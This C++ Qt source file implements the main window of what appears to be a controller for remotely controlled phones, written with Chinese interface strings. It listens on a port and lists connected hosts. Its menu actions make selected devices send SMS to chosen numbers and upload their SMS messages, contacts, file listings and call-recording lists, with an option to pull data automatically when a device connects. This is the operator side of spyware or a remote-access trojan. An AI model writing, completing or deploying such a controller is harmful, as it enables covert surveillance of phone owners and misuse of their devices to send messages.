#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QJsonDocument>
#include <QJsonArray>
#include <QJsonObject>
#include <QDateTime>
#include <QFile>
#include <QDir>
#include <QTextStream>
#include <QMessageBox>
#include <QInputDialog>
#include <QCloseEvent>
#include <QMouseEvent>
#include "dialog/sendsmsdialog.h"

MainWindow::MainWindow(SessionManager& sessionManager, QWidget *parent) :
    mSessionManager(sessionManager),
    mNetworkManager(sessionManager),
    mModelHostList(mNetworkManager.getHostPool()),
    mPort(8000),
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    init();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::closeEvent(QCloseEvent * event)
{
    if(QMessageBox::information(this,QString(" "),QStringLiteral("退出?"),QMessageBox::Yes,QMessageBox::No)!=QMessageBox::Yes)
    {
        event->ignore();
    }
    else
    {
        event->accept();
    }
}

void MainWindow::initMenu(QWidget* widget)
{
    QAction *aAll,*aNone,*aReverse;
    widget->addAction(aAll = new QAction(QStringLiteral("全选"),widget));
    widget->addAction(aNone = new QAction(QStringLiteral("全不选"),widget));
    widget->addAction(aReverse = new QAction(QStringLiteral("反选"),widget));

    QObject::connect(aAll,SIGNAL(triggered()),&mModelHostList,SLOT(selectAll()));
    QObject::connect(aNone,SIGNAL(triggered()),&mModelHostList,SLOT(unselectAll()));
    QObject::connect(aReverse,SIGNAL(triggered()),&mModelHostList,SLOT(reverseSelect()));

    QAction *separator = new QAction(QString(),widget);
    separator->setSeparator(true);
    widget->addAction(separator);


    QAction *aSendSms,*aLoadContact,*aLoadSms;
    widget->addAction(aSendSms = new QAction(QStringLiteral("发送短信"),widget));
    widget->addAction(aLoadContact = new QAction(QStringLiteral("载入联系人数据"),widget));
    widget->addAction(aLoadSms = new QAction(QStringLiteral("载入短信数据"),widget));

    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
}

void MainWindow::initMenuWithItem(QWidget* widget)
{
    QAction* aDownloadFile;
    widget->addAction(aDownloadFile = new QAction(QStringLiteral("文件传输"), widget));
    QObject::connect(aDownloadFile, SIGNAL(triggered()), this, SLOT(listFile()));

    QAction* aAudioRecordList;
    widget->addAction(aAudioRecordList = new QAction(QStringLiteral("录音列表"),widget));
    QObject::connect(aAudioRecordList, SIGNAL(triggered()), this, SLOT(listAudioRecord()));

    QAction *separator = new QAction(QString(),widget);
    separator->setSeparator(true);
    widget->addAction(separator);
}

void MainWindow::initNetworkManager()
{
    qRegisterMetaType<HostInfo>("HostInfo");
    QObject::connect(&mNetworkManager, SIGNAL(onHostPoolChange()), &mModelHostList, SLOT(refresh()));
    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionSuccess(QString,HostInfo)), this, SLOT(onStartSessionSuccess(QString,HostInfo)));
    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionFailed(QString,HostInfo)), this, SLOT(onStartSessionFailed(QString,HostInfo)));
}

void MainWindow::initHostList()
{
    ui->tableViewHostList->setModel(&mModelHostList);
    ui->tableViewHostList->setContextMenuPolicy(Qt::CustomContextMenu);
    ui->tableViewHostList->resizeColumnToContents(0);
    ui->tableViewHostList->horizontalHeader()->resizeSection(1, 200);
    QObject::connect(&mModelHostList,SIGNAL(modelReset()),this,SLOT(updateHostListView()));
}


void MainWindow::init()
{
    initNetworkManager();
    initHostList();

    initMenuWithItem(&mMenuWithItem);
    initMenu(&mMenuWithItem);
    initMenu(&mMenu);

    ui->actionListenPort->setText(QStringLiteral("开始监听"));
    ui->actionAutoLoadData->setText(QStringLiteral("上线自动载入数据"));
    QObject::connect(ui->actionListenPort, SIGNAL(triggered()), this, SLOT(handleServerStart()));
    updateHostListView();

    for(int i = 1; i<mModelHostList.columnCount(); ++i) {
        ui->tableViewHostList->setColumnWidth(i, 150);
    }

    outputLogWarning(QStringLiteral("====================   程序开始运行  ===================="));
}

void MainWindow::updateHostListView()
{
    ui->hostCountLabel->setText(QStringLiteral("主机数: %1, 选中主机数: %2").arg(mNetworkManager.getHostPool().size()).arg(mNetworkManager.getHostPool().getSelectedCount()));
}

void MainWindow::handleServerStart()
{
    if(mNetworkManager.isStart())
    {
        mNetworkManager.stop();
        mNetworkManager.getHostPool().cleanAll();
        ui->actionListenPort->setText(QStringLiteral("开始监听"));
        outputLogNormal(QStringLiteral("停止监听"));
    }
    else
    {
        bool ok = false;
        mPort = QInputDialog::getInt(this, QStringLiteral("监听端口"), QStringLiteral("输入端口:"), mPort,  1, 65535, 1, &ok);
        if(ok)
        {
            if(mNetworkManager.start(mPort))
            {
                ui->actionListenPort->setText(QStringLiteral("停止监听 (监听在 %1 端口)").arg(mPort));
                outputLogNormal(QStringLiteral("监听在 %1 端口").arg(mPort) );
            }
            else
            {
                QMessageBox::warning(this,QString("Warning"),QStringLiteral("监听在端口 %1 失败").arg(mPort));
                outputLogWarning(QStringLiteral("[失败] 监听在 %1 端口").arg(mPort) );
            }
        }
    }
}

void MainWindow::sendSms()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
        return;
    }
    SendSmsDialog sendSmsDialog(this);
    if(sendSmsDialog.exec()==QDialog::Accepted)
    {
        QJsonObject jsonObject;
        QJsonDocument jsonDocument;
        jsonObject.insert(QString("content"), sendSmsDialog.getContent());
        if(sendSmsDialog.isSendNumberList())
        {
            QJsonArray jsonArray;
            vector<QString> numberList = sendSmsDialog.getPhoneNumberList();
            unsigned int i;
            for(i=0; i<numberList.size(); ++i)
            {
                jsonArray.append(numberList.at(i));
            }
            jsonObject.insert(QString("only"), jsonArray);
        }
        jsonDocument.setObject(jsonObject);
        vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
        for(unsigned int i=0; i<hostInfoList.size(); ++i)
        {
            mNetworkManager.startSession(hostInfoList.at(i), ACTION_SEND_SMS, jsonDocument.toJson());
        }
    }
}
void MainWindow::loadSms()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
        return;
    }
    vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
    for(unsigned int i=0; i<hostInfoList.size(); ++i)
    {
        mNetworkManager.startSession(hostInfoList.at(i), ACTION_UPLOAD_SMS);
    }
}
void MainWindow::loadContact()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
        return;
    }
    vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
    for(unsigned int i=0; i<hostInfoList.size(); ++i)
    {
        mNetworkManager.startSession(hostInfoList.at(i), ACTION_UPLOAD_CONTACT);
    }
}

void MainWindow::listFile()
{
    mNetworkManager.startSession(mHostInfo, ACTION_FILE_LIST);
}

void MainWindow::listAudioRecord()
{
    mNetworkManager.startSession(mHostInfo, ACTION_CALL_RECORD);
}


void MainWindow::on_tableViewHostList_doubleClicked(const QModelIndex &index)
{

}

void MainWindow::outputLogNormal(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + text );
}

void MainWindow::outputLogWarning(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#F00>" + text + "</font>");
}

void MainWindow::outputLogSuccess(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#0A0>" + text + "</font>");
}


void MainWindow::onStartSessionSuccess(QString sessionName, HostInfo hostInfo)
{
    outputLogSuccess( QStringLiteral("[成功] 在 %1:%2 上执行 '%3'").arg(hostInfo.addr.toString()).arg(hostInfo.port).arg(sessionName)  );
}
void MainWindow::onStartSessionFailed(QString sessionName, HostInfo hostInfo)
{
    outputLogWarning( QStringLiteral("[失败] 在 %1:%2 上执行 '%3'").arg(hostInfo.addr.toString()).arg(hostInfo.port).arg(sessionName)  );
}

void MainWindow::on_tableViewHostList_customContextMenuRequested(const QPoint &pos)
{
    QModelIndex index = ui->tableViewHostList->indexAt(pos);
    if(mNetworkManager.getHostPool().getHostInfo(index.row(), mHostInfo))
    {
        mMenuWithItem.popup(QCursor::pos());
    }
    else
    {
        mMenu.popup(QCursor::pos());
    }
}
